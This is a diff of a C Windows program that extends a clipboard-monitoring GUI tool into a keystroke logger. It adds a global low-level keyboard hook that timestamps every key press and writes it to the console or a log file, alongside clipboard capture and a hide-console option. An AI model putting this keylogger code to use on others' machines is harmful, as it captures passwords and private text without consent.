@@ -1,16 +1,33 @@
+#include <stdbool.h>
 #include <stdio.h>
 #include <time.h>
 #include <windows.h>
-#define StartButtonID 0
-#define StopButtonID 1
-#define ClearConsoleButtonID 2
-#define WriteOnFileCheckBoxID 3
-#define HideConsoleCheckBoxID 4
-#define DeleteFileButtonID 5
+#define listenClipboardID 0
+#define listenKeystrokesID 1
+#define writeOnConsoleID 2
+#define writeOnFileID 3
+#define hideConsoleID 4
 
-BOOL FileExists(LPCTSTR szPath) {
-  DWORD dwAttrib = GetFileAttributes(szPath);
-  return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
+bool writeOnConsole = true;
+bool writeOnFile = false;
+HHOOK hook = 0;
+
+LRESULT CALLBACK keyProc(int nCode, WPARAM wParam, LPARAM lParam) {
+	time_t now = time(0);
+	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam;
+	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+		int key = p->vkCode;
+		char ch = MapVirtualKeyA(key, MAPVK_VK_TO_CHAR) != 0 ? MapVirtualKeyA(key, MAPVK_VK_TO_CHAR) : key;
+		if (writeOnFile) {
+		 FILE* file = fopen("logs.txt", "a");
+		 fprintf(file, "%s: 0x%X %c\n", strtok(ctime(&now), "\n"), key, ch);
+		 fclose(file);
+	    }
+	    if (writeOnConsole) {
+	     printf("%s: 0x%X %c\n", strtok(ctime(&now), "\n"), key, ch);
+		}
+	}
+	return 0;
 }
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam) {
@@ -18,18 +35,14 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam) 
 	switch(Message) {
 		
     	case WM_CREATE : {
-    		 SetConsoleTitle("Clipboard Listener Version 1.0 Console");
+    		 SetConsoleTitle("Listener Version 1.0 Console");
     		 SetWindowLongA(hwnd, GWL_STYLE, GetWindowLong(hwnd, GWL_STYLE) & ~WS_MAXIMIZEBOX);		 
-    	     CreateWindow("BUTTON", "Start listening", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 10, 10, 110, 25, hwnd, (HMENU) StartButtonID, NULL, NULL);
-    	     CreateWindow("BUTTON", "Stop listening", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 150, 10, 110, 25, hwnd, (HMENU) StopButtonID, NULL, NULL);
-    	     CreateWindow("BUTTON", "Clear console", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 290, 10, 110, 25, hwnd, (HMENU) ClearConsoleButtonID, NULL, NULL);
-    	     CreateWindow("BUTTON", "Delete logs file", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 430, 10, 110, 25, hwnd, (HMENU) DeleteFileButtonID, NULL, NULL);
-			 CreateWindow("BUTTON", "Write logs file", WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 10, 40, 120, 25, hwnd, (HMENU) WriteOnFileCheckBoxID, NULL, NULL);
- 			 CreateWindow("BUTTON", "Hide console", WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 150, 40, 110, 25, hwnd, (HMENU) HideConsoleCheckBoxID, NULL, NULL);
-			 printf("---%s", ctime (&now));
-			 printf("Message: listening disabled");
-			 printf("\n\n---%s", ctime (&now));
-			 printf("Message: logs file writing disabled");
+    	     CreateWindow("BUTTON", "Listen clipboard", WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 10, 10, 160, 25, hwnd, (HMENU) listenClipboardID, NULL, NULL);
+    	     CreateWindow("BUTTON", "Listen keystrokes", WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 170, 10, 160, 25, hwnd, (HMENU) listenKeystrokesID, NULL, NULL);
+  			 CreateWindow("BUTTON", "Hide console", WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 330, 10, 160, 25, hwnd, (HMENU) hideConsoleID, NULL, NULL);			 
+			 CreateWindow("BUTTON", "Write logs on file", WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 10, 40, 160, 25, hwnd, (HMENU) writeOnFileID, NULL, NULL);
+ 			 CreateWindow("BUTTON", "Write logs on console", WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 170, 40, 160, 25, hwnd, (HMENU) writeOnConsoleID, NULL, NULL);
+			 CheckDlgButton(hwnd, writeOnConsoleID, BST_CHECKED);
 			 break;
     	}
     	
@@ -55,65 +68,53 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam) 
 		}
 		
 		case WM_COMMAND : {
-		     if(LOWORD(wParam) == StartButtonID) {
-		       SetClipboardViewer(hwnd);
-		       printf("\n\n---%s", ctime (&now));
-		       printf("Message: listening enabled");
-			 }
-			 if(LOWORD(wParam) == StopButtonID) {
-			   ChangeClipboardChain(hwnd, NULL);
-			   printf("\n\n---%s", ctime (&now));
-			   printf("Message: listening disabled");
-			 }
-			 if(LOWORD(wParam) == ClearConsoleButtonID) {
-			   system("cls");
-			   if(GetClipboardViewer() == hwnd) {
-			   	printf("---%s", ctime (&now));
-		        printf("Message: listening enabled");
+		     if(wParam == listenClipboardID) {
+		       if(IsDlgButtonChecked(hwnd, listenClipboardID) == BST_UNCHECKED) {
+			   	CheckDlgButton(hwnd, listenClipboardID, BST_CHECKED);
+			   	SetClipboardViewer(hwnd);
 			   }
 			   else {
-			   	printf("---%s", ctime (&now));
-			    printf("Message: listening disabled");
+			   	CheckDlgButton(hwnd, listenClipboardID, BST_UNCHECKED);
+			   	ChangeClipboardChain(hwnd, NULL);
 			   }
-			   if(IsDlgButtonChecked(hwnd, WriteOnFileCheckBoxID) == BST_CHECKED) {
-			   	printf("\n\n---%s", ctime (&now));
-		        printf("Message: logs file writing enabled");
+			 }
+			 if(wParam == listenKeystrokesID) {
+		       if(IsDlgButtonChecked(hwnd, listenKeystrokesID) == BST_UNCHECKED) {
+			   	CheckDlgButton(hwnd, listenKeystrokesID, BST_CHECKED);
+			   	hook = SetWindowsHookEx(WH_KEYBOARD_LL, &keyProc, NULL, 0);
 			   }
 			   else {
-			   	printf("\n\n---%s", ctime (&now));
-			    printf("Message: logs file writing disabled"); 
+			   	CheckDlgButton(hwnd, listenKeystrokesID, BST_UNCHECKED);
+			   	UnhookWindowsHookEx(hook);
 			   }
 			 }
-			 if(LOWORD(wParam) == DeleteFileButtonID) {
-			    if(FileExists("CLv1.0Logs.txt")) {
-			    	remove("CLv1.0Logs.txt");
-			    	printf("\n\n---%s", ctime (&now));
-			    	printf("Message: logs file deleted");
-				}
-			    else {
-			    	printf("\n\n---%s", ctime (&now));
-			    	printf("Message: logs file not found");
-				}
-			 }
-			 if(LOWORD(wParam) == WriteOnFileCheckBoxID) {
-			   if(IsDlgButtonChecked(hwnd, WriteOnFileCheckBoxID) == BST_UNCHECKED) {
-			   	CheckDlgButton(hwnd, WriteOnFileCheckBoxID, BST_CHECKED);
-			   	printf("\n\n---%s", ctime (&now));
-		        printf("Message: logs file writing enabled");
+			 if(wParam == writeOnConsoleID) {
+			   if(IsDlgButtonChecked(hwnd, writeOnConsoleID) == BST_UNCHECKED) {
+			   	CheckDlgButton(hwnd, writeOnConsoleID, BST_CHECKED);
+			   	writeOnConsole = true;
 			   }
 			   else {
-			   	CheckDlgButton(hwnd, WriteOnFileCheckBoxID, BST_UNCHECKED);
-			   	printf("\n\n---%s", ctime (&now));
-			    printf("Message: logs file writing disabled");
+			   	CheckDlgButton(hwnd, writeOnConsoleID, BST_UNCHECKED);
+			   	writeOnConsole = false;
 			   }
 			 }
-			 if(LOWORD(wParam) == HideConsoleCheckBoxID) {
-			   if(IsDlgButtonChecked(hwnd, HideConsoleCheckBoxID) == BST_UNCHECKED) {
-		        CheckDlgButton(hwnd, HideConsoleCheckBoxID, BST_CHECKED);
+			 if(wParam == writeOnFileID) {
+			   if(IsDlgButtonChecked(hwnd, writeOnFileID) == BST_UNCHECKED) {
+			   	CheckDlgButton(hwnd, writeOnFileID, BST_CHECKED);
+			   	writeOnFile = true;
+			   }
+			   else {
+			   	CheckDlgButton(hwnd, writeOnFileID, BST_UNCHECKED);
+			   	writeOnFile = false;
+			   }
+			 }
+			 if(wParam == hideConsoleID) {
+			   if(IsDlgButtonChecked(hwnd, hideConsoleID) == BST_UNCHECKED) {
+		        CheckDlgButton(hwnd, hideConsoleID, BST_CHECKED);
 		        ShowWindow(GetConsoleWindow(), SW_HIDE);
 			   }
 			   else {
-			   	CheckDlgButton(hwnd, HideConsoleCheckBoxID, BST_UNCHECKED);
+			   	CheckDlgButton(hwnd, hideConsoleID, BST_UNCHECKED);
 		        ShowWindow(GetConsoleWindow(), SW_SHOW);
 			   }
 			 }
@@ -122,29 +123,20 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam) 
 		
 		 case WM_DRAWCLIPBOARD : {
 		 	 if (OpenClipboard(hwnd)) {
-               HANDLE ClipData = GetClipboardData(CF_TEXT);
-               LPCTSTR clipData = (LPCTSTR) GlobalLock(ClipData);
-               GlobalUnlock(ClipData);
+               HANDLE clipData = GetClipboardData(CF_TEXT);
+               const char* clipText = (const char*) GlobalLock(clipData);
+               GlobalUnlock(clipData);
                CloseClipboard();
-               if(clipData != NULL) {
-                printf("\n\n---%s", ctime (&now));
-                printf("Listened: %s", clipData);
-                if(IsDlgButtonChecked(hwnd, WriteOnFileCheckBoxID) == BST_CHECKED) {
-            	    HANDLE hFile = CreateFile("CLv1.0Logs.txt", FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-                	LPCTSTR firstPart = "---";
-                	unsigned long long int size = strlen(firstPart);
-                	WriteFile(hFile, firstPart, size, (LPDWORD) &size, NULL);
-                	LPCTSTR secondPart = ctime(&now);
-                	size = strlen(secondPart);
-                	WriteFile(hFile, secondPart, size, (LPDWORD) &size, NULL);
-                	size = strlen(clipData);
-                	WriteFile(hFile, clipData, size, (LPDWORD) &size, NULL);
-                	LPCTSTR fourthPart = "\n\r";
-                	size = strlen(fourthPart);
-                	WriteFile(hFile, fourthPart, size, (LPDWORD) &size, NULL);
-                	CloseHandle(hFile);
+               if(clipText != NULL) {
+               	if(writeOnConsole) {
+               	 printf("%s:\n%s\n", strtok(ctime(&now), "\n"), clipText);
 				}
-			  }      
+                if(writeOnFile) {
+                  FILE* file = fopen("logs.txt", "a");
+		          fprintf(file, "%s:\n%s\n", strtok(ctime(&now), "\n"), clipText);
+		          fclose(file);
+			   }
+			  }   
              }			
              break; 
 		}
@@ -160,22 +152,21 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 {
 	WNDCLASSEX wc = {};
 	wc.cbSize = sizeof(WNDCLASSEX);
-	wc.lpfnWndProc	 = WndProc; 
+	wc.lpfnWndProc = WndProc; 
 	wc.hInstance = hInstance;
-	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
 	wc.lpszClassName = "WindowClass";
 
 	if(!RegisterClassEx(&wc)) {
 		return 0;
 	}
 
-	HWND hwnd = CreateWindowEx(0,"WindowClass","Clipboard Listener Version 1.0", WS_VISIBLE | WS_OVERLAPPEDWINDOW ^ WS_THICKFRAME, CW_USEDEFAULT, CW_USEDEFAULT, 555, 100, NULL,NULL,hInstance,NULL);
+	HWND hwnd = CreateWindowEx(0,"WindowClass","Listener Version 1.0", WS_VISIBLE | WS_OVERLAPPEDWINDOW ^ WS_THICKFRAME, CW_USEDEFAULT, CW_USEDEFAULT, 555, 100, NULL,NULL,hInstance,NULL);
 		                        
 	if(hwnd == NULL) {
 		return 0;
 	}
    
-	MSG msg;
+	MSG msg = {};
 	while(GetMessage(&msg, NULL, 0, 0) > 0) { 
 		TranslateMessage(&msg); 
 		DispatchMessage(&msg); 
